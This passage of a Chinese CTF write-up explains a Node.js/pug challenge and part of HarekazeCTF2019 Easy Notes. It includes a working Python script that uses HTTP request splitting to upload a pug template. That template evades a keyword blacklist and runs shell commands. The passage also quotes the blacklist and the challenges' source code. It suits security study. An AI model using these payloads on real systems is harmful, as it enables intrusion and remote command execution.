class="hljs-keyword">var</span> arrayLen = evilwords.<span class="hljs-property">length</span>;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; arrayLen; i++) &#123;<br>        <span class="hljs-keyword">const</span> trigger = url.<span class="hljs-title function_">includes</span>(evilwords[i]);<br>        <span class="hljs-keyword">if</span> (trigger === <span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 启动服务器监听端口8081</span><br><span class="hljs-keyword">var</span> server = app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">8081</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> host = server.<span class="hljs-title function_">address</span>().<span class="hljs-property">address</span>;<br>    <span class="hljs-keyword">var</span> port = server.<span class="hljs-title function_">address</span>().<span class="hljs-property">port</span>;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Example app listening at http://%s:%s&quot;</span>, host, port);<br>&#125;);<br></code></pre></td></tr></table></figure>

<p>下面的链接是文件上传，不过提示只有<code>admin</code>的<code>ip</code>才可以使用：<code>?action=upload</code></p>
<p>不过前面的代码已经解释了，只要<code>127.0.0.1</code>才行，注意这东西没法伪造。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;msg&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;only admin&#x27;s ip can use it&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>

<p><code>blacklist</code>函数过滤了一系列关键字：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">blacklist</span>(<span class="hljs-params">url</span>) &#123;<br>    <span class="hljs-keyword">var</span> evilwords = [<span class="hljs-string">&quot;global&quot;</span>, <span class="hljs-string">&quot;process&quot;</span>, <span class="hljs-string">&quot;mainModule&quot;</span>, <span class="hljs-string">&quot;require&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;child_process&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;!&quot;</span>];<br></code></pre></td></tr></table></figure>

<p>不过<code>js</code>本身就是一种非常灵活的语言，所以他这么过滤基本没啥用。</p>
<p>搜了下<code>pug</code>模板注入，也参考了几位师傅的文章：</p>
<p><a target="_blank" rel="noopener" href="https://chenlvtang.top/2021/03/08/%E9%80%9A%E8%BF%87HTTP%E8%AF%B7%E6%B1%82%E6%8B%86%E5%88%86%E8%BF%9B%E8%A1%8CSSRF/">参考文章</a></p>
<p><a target="_blank" rel="noopener" href="https://guokeya.github.io/post/hz6_KR03h/">参考wenzhang</a></p>
<p>思路就是通过<code>core</code>路由提供的内网<code>URL</code>请求进行<code>SSRF</code>实现<code>file_upload</code>路由中文件上传的功能。然后配合<code>pug模板</code>渲染进行命令执行。</p>
<p>参考文章里的脚本(我自己写不出来)：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> requests<br><br>payload = <span class="hljs-string">&#x27;&#x27;&#x27; HTTP/1.1</span><br><span class="hljs-string"></span><br><span class="hljs-string">POST /file_upload HTTP/1.1</span><br><span class="hljs-string">Content-Type: multipart/form-data; boundary=---------------------------41671423531508392532090664957</span><br><span class="hljs-string">Content-Length: 350</span><br><span class="hljs-string"></span><br><span class="hljs-string">-----------------------------41671423531508392532090664957</span><br><span class="hljs-string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.pug&quot;</span><br><span class="hljs-string">Content-Type: ../template</span><br><span class="hljs-string"></span><br><span class="hljs-string">-var x = eval(&quot;glob&quot;+&quot;al.proce&quot;+&quot;ss.mainMo&quot;+&quot;dule.re&quot;+&quot;quire(&#x27;child_&#x27;+&#x27;pro&#x27;+&#x27;cess&#x27;)[&#x27;ex&#x27;+&#x27;ecSync&#x27;](&#x27;cat /flag.txt&#x27;).toString()&quot;)</span><br><span class="hljs-string">-return x</span><br><span class="hljs-string">-----------------------------41671423531508392532090664957--</span><br><span class="hljs-string"></span><br><span class="hljs-string">GET /flag HTTP/1.1</span><br><span class="hljs-string">x:&#x27;&#x27;&#x27;</span><br>payload = payload.replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;\r\n&quot;</span>)<br>payload = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;0xff&#x27;</span> + <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> payload) <br><span class="hljs-built_in">print</span>(payload)<br>r = requests.get(<span class="hljs-string">&#x27;http://5e5020f0-cba3-4d9e-98ff-81274c42ce13.node3.buuoj.cn/core?q=&#x27;</span> + urllib.parse.quote(payload))<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>

<p>GET &#x2F;flag只是为了闭合HTTP请求：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs awk">原始请求数据如下：<br>GET <span class="hljs-regexp">/ HTTP/</span><span class="hljs-number">1.1</span><br>Host: xxx.xxx.xxx<br><br>当我们插入数据后:<br>GET <span class="hljs-regexp">/ HTTP/</span><span class="hljs-number">1.1</span><br><br>GET <span class="hljs-regexp">/upload_file HTTP/</span><span class="hljs-number">1.1</span><br>xxxxxx文件上传<br>xxxxxx文件上传<br><br>Host:xxxxxxxxxx<br><br>上次请求包的Host参数就单独出来了。会报错。所以我们再构造一个请求把他闭合<br><br>GET <span class="hljs-regexp">/ HTTP/</span><span class="hljs-number">1.1</span><br><br>GET <span class="hljs-regexp">/upload_file HTTP/</span><span class="hljs-number">1.1</span><br>xxxxxx文件上传<br>xxxxxx文件上传<br><br>GET <span class="hljs-regexp">/flag HTTP/</span><span class="hljs-number">1.1</span><br>x:Host:xxxxxxxxxx<br>为啥要加这个x:我也不是很清楚。因为如果不加直接就以Host:xxxx闭合了，但不加这东西还执行不了命令。。。<br></code></pre></td></tr></table></figure>

<p>然后就是怎么执行命令(pug模板规则，感觉这东西有一点点像yaml?)：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js">- <span class="hljs-keyword">var</span> x =<span class="hljs-number">1</span><br>- <span class="hljs-keyword">return</span> x<br><span class="hljs-comment">//访问页面会看到1</span><br></code></pre></td></tr></table></figure>

<p>所以可以通过：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">-<span class="hljs-keyword">var</span> x = <span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;glob&quot;</span>+<span class="hljs-string">&quot;al.proce&quot;</span>+<span class="hljs-string">&quot;ss.mainMo&quot;</span>+<span class="hljs-string">&quot;dule.re&quot;</span>+<span class="hljs-string">&quot;quire(&#x27;child_&#x27;+&#x27;pro&#x27;+&#x27;cess&#x27;)[&#x27;ex&#x27;+&#x27;ecSync&#x27;](&#x27;cat /flag.txt&#x27;).toString()&quot;</span>)<br>-<span class="hljs-keyword">return</span> x<br></code></pre></td></tr></table></figure>

<p>这种拼接来绕过黑名单从而执行命令</p>
<p>然后是<code>payload</code>的转换，首先黑名单里出了关键字还过滤了单双引号，需要编码绕过:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">blacklist</span>(<span class="hljs-params">url</span>) &#123;<br>    <span class="hljs-keyword">var</span> evilwords = [<span class="hljs-string">&quot;global&quot;</span>, <span class="hljs-string">&quot;process&quot;</span>, <span class="hljs-string">&quot;mainModule&quot;</span>, <span class="hljs-string">&quot;require&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;child_process&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;!&quot;</span>];<br></code></pre></td></tr></table></figure>

<p>脚本里用的这种编码绕过：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;0xff&#x27;</span> + <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>), <span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> payload)<br></code></pre></td></tr></table></figure>

<p>这个编码方式没搞懂。。</p>
<h2 id="HarekazeCTF2019-Easy-Notes"><a href="#HarekazeCTF2019-Easy-Notes" class="headerlink" title="[HarekazeCTF2019]Easy Notes"></a>[HarekazeCTF2019]Easy Notes</h2><p>提示<code>admin</code>用户才能<code>GetFlag</code>，然后存在下载我们上传的<code>Notes</code>功能：</p>
<p>一开始以为这里存在任意文件下载，但并没有</p>
<p>源码 ：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//lib.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">redirect</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br>  <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: &#x27;</span> . <span class="hljs-variable">$path</span>);<br>  <span class="hljs-keyword">exit</span>();<br>&#125;<br><br><span class="hljs-comment">// utility functions</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">e</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>, ENT_QUOTES);<br>&#125;<br><br><span class="hljs-comment">// user-related functions</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">validate_user</span>(<span class="hljs-params"><span class="hljs-variable">$user</span></span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$user</span>)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\A[0-9A-Z_-]&#123;4,64&#125;\z/i&#x27;</span>, <span class="hljs-variable">$user</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_logged_in</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>]);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set_user</span>(<span class="hljs-params"><span class="hljs-variable">$user</span></span>) </span>&#123;<br>  <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-variable">$user</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_user</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_admin</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>] === <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-comment">// note-related functions</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_notes</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;notes&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;notes&#x27;</span>] = [];<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;notes&#x27;</span>];<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add_note</span>(<span class="hljs-params"><span class="hljs-variable">$title</span>, <span class="hljs-variable">$body</span></span>) </span>&#123;<br>  <span class="hljs-variable">$notes</span> = <span class="hljs-title function_ invoke__">get_notes</span>();<br>  <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$notes</span>, [<br>    <span class="hljs-string">&#x27;title&#x27;</span> =&gt; <span class="hljs-variable">$title</span>,<br>    <span class="hljs-string">&#x27;body&#x27;</span> =&gt; <span class="hljs-variable">$body</span>,<br>    <span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">hash</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-title function_ invoke__">microtime</span>())<br>  ]);<br>  <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;notes&#x27;</span>] = <span class="hljs-variable">$notes</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">find_note</span>(<span class="hljs-params"><span class="hljs-variable">$notes</span>, <span class="hljs-variable">$id</span></span>) </span>&#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-variable">$index</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$index</span> &lt; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$notes</span>); <span class="hljs-variable">$index</span>++) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$notes</span>[<span class="hljs-variable">$index</span>][<span class="hljs-string">&#x27;id&#x27;</span>] === <span class="hljs-variable">$id</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable">$index</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delete_note</span>(<span class="hljs-params"><span class="hljs-variable">$id</span></span>) </span>&#123;<br>  <span class="hljs-variable">$notes</span> = <span class="hljs-title function_ invoke__">get_notes</span>();<br>  <span class="hljs-variable">$index</span> = <span class="hljs-title function_ invoke__">find_note</span>(<span class="hljs-variable">$notes</span>, <span class="hljs-variable">$id</span>);<br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$index</span> !== <span class="hljs-literal">FALSE</span>) &#123;<br>    <span class="hljs-title function_ invoke__">array_splice</span>(<span class="hljs-variable">$notes</span>, <span class="hljs-variable">$index</span>, <span class="hljs-number">1</span>);<br>  &#125;<br>  <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;notes&#x27;</span>] = <span class="hljs-variable">$notes</span>;<br>&#125;<br><span class="hljs-comment">//export.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;init.php&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_logged_in</span>()) &#123;<br>  <span class="hljs-title function_ invoke__">redirect</span>(<span class="hljs-string">&#x27;/easy-notes/?page=home&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$notes</span> = <span class="hljs-title function_ invoke__">get_notes</span>();<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;type&#x27;</span>]) || <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;type&#x27;</span>])) &#123;<br>  <span class="hljs-variable">$type</span> = <span class="hljs-string">&#x27;zip&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-variable">$type</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;type&#x27;</span>];<br>&#125;<br><br><span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">get_user</span>() . <span class="hljs-string">&#x27;-&#x27;</span> . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">8</span>)) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$type</span>;<br><span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;..&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$filename</span>); <span class="hljs-comment">// avoid path traversal</span><br><span class="hljs-variable">$path</span> = TEMP_DIR . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$filename</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$type</span> === <span class="hljs-string">&#x27;tar&#x27;</span>) &#123;<br>  <span class="hljs-variable">$archive</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PharData</span>(<span class="hljs-variable">$path</span>);<br>  <span class="hljs-variable">$archive</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-comment">// use zip as default</span><br>  <span class="hljs-variable">$archive</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();<br>  <span class="hljs-variable">$archive</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-variable">$path</span>, ZIPARCHIVE::<span class="hljs-variable constant_">CREATE</span> | <span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">OVERWRITE</span>);<br>&#125;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$index</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$index</span> &lt; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$notes</span>); <span class="hljs-variable">$index</span>++) &#123;<br>  <span class="hljs-variable">$note</span> = <span class="hljs-variable">$notes</span>[<span class="hljs-variable">$index</span>];<br>  <span class="hljs-variable">$title</span> = <span class="hljs-variable">$note</span>[<span class="hljs-string">&#x27;title&#x27;</span>];<br>  <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^!-~]/&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-variable">$title</span>);<br>  <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;#[/\\?*.]#&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-variable">$title</span>); <span class="hljs-comment">// delete suspicious characters</span><br>  <span class="hljs-variable">$archive</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;<span class="hljs-subst">&#123;$index&#125;</span>_<span class="hljs-subst">&#123;$title&#125;</span>.json&quot;</span>, <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$note</span>));<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$type</span> === <span class="hljs-string">&#x27;tar&#x27;</span>) &#123;<br>  <span class="hljs-variable">$archive</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>  <span class="hljs-variable">$archive</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>&#125;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Disposition: attachment; filename=&quot;&#x27;</span> . <span class="hljs-variable">$filename</span> . <span class="hljs-string">&#x27;&quot;;&#x27;</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Length: &#x27;</span> . <span class="hljs-title function_ invoke__">filesize</span>(<span class="hljs-variable">$path</span>));<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: application/zip&#x27;</span>);<br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$path</span>);<br><span class="hljs-comment">//init.php</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;lib.php&#x27;</span>);<br><br><span class="hljs-title function_ invoke__">session_save_path</span>(TEMP_DIR);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);<br><span class="hljs-comment">//config.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;TEMP_DIR&#x27;</span>, <span class="hljs-string">&#x27;tmp/&#x27;</span>);<br><br></code></pre></td></tr></table></figure>

<p>代码不难理解，主要是这么个东西：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_admin</span>(<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>] === <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>其实前面也做过一些<code>SESSION</code>的题，现在稍微有点思路：</p>
<blockquote>
<p>1.php的session默认存储文件名是sess_+PHPSESSID的值</p>
<p>2.抓包获得session值由此获得相应存储文件，然后判断引擎修改相应文件</p>
</blockquote>
<p>但还是老问题，下载文件抓包是这个，没法实现任意文件下载：</p>
<p><img src="/img/SWPU2019Web32.png" srcset="/img/loading.gif" lazyload alt="SWPU2019Web32"></p>
<p>下载的文件名类似这种：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">get_user</span>() . <span class="hljs-string">&#x27;-&#x27;</span> . <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">8</span>)) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$type</span>;<br><span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;..&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$filename</span>); <span class="hljs-comment">// avoid path traversal</span><br></code></pre></td></tr></table></figure>

<p><img src="/img/SWPU2019Web33.png" srcset="/img/loading.gif" lazyload alt="SWPU2019Web33"></p>
<p><code>user</code>这东西我们可以控制，可以设置成类似<code>sess_</code>这种，但他后面给加了个<code>-</code>和十六位十六进制的随机字符串。。<code>type</code>的话通过设置成<code>.</code>然后被替换为空，这时我们下载的文件就是：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">sess_-随机十六位十六进制<br></code></pre></td></tr></table></figure>

<p>一开始以为<code>session</code>文件不能带横线，后面查了一下，只要这种格式都可以：</p>
<p>session 文件以 <code>sess_</code> 开头，且只含有 <code>a-z</code>，<code>A-Z</code>，<code>0-9</code>，<code>-</code>。</p>
<p>文件名解决了，不过压缩包中的数据如何处理也要考虑：</p>
